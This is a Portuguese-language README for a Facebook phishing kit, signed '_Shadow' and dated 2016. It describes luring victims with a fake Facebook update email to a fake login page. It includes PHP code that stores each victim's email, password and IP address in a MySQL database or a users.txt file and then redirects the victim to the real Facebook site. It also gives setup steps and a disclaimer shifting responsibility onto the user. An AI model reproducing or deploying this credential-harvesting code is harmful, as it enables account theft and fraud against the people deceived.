	Fishing Facebook
	Criado por: _Shadow
	Data: 02/06/2016

	* COMO USAR: Este sistema funciona da seguinte forma, a vitma entra em seu fishing graças a algum tipo de
	* engenharia social, como por exemplo: falso suposto email do facebook dizendo que estão fazendo
	* atualizações novas e para testar está atualização a pessoa deve executar o Login em sua Página fake
	* do facebook, nisso você irá conseguir capturar as informações da vitima, que será enviada ou para um
	* banco de dados, ou para o arquivo users.txt

	* OBS: Conheçimento não é crime, apenas estou dando a você uma simples ferramenta, mas o responsavel
	* pelo modo que irá usar está ferramenta é você

	* Em caso de BUGS por favor entre em contato comigo :D

	* O sisteminha contem 2 funções de exportação dos dados, em primeiro lugar temos por Banco de Dados 
	* MYSQL, que garante uma segurança maior com os dados recebidos e capturados de suas vitimas, em
	* segundo lugar temos o envio dos dados capturados para um arquivo chamado users.txt
	* Caso queira usar a função users.txt você deverá deletar a pasta db.php e depois no arquivo
	* login.php voce deverá apagar:

	################################################### Nº 1
	include_once('db.php');
	$pdo = conectar();

	# Info
	$login = $_POST['email'];
	$passw = $_POST['pass'];
	$ipmac = $_SERVER['REMOTE_ADDR'];

	$add = $pdo->prepare("INSERT INTO users (login,senha,ip) VALUES (:login,:senha,:ip)");

	$add->bindValue(":login", $login);
	$add->bindValue(":senha", $passw);
	$add->bindValue(":ip", $ipmac);
	$add->execute();
	header("Location: http://www.facebook.com");
	################################################### end
	
	* e depois que apagar estas linhas basta tirar o /* */ da segunda função
	* Caso queira usar a função do Banco de Dados, basta configurar o arquivo db.php de acordo
	* com as preferencias de sua host e upar o arquivo fishingfb.sql em seu localhost
	*
	* Divirta-se By: _Shadow
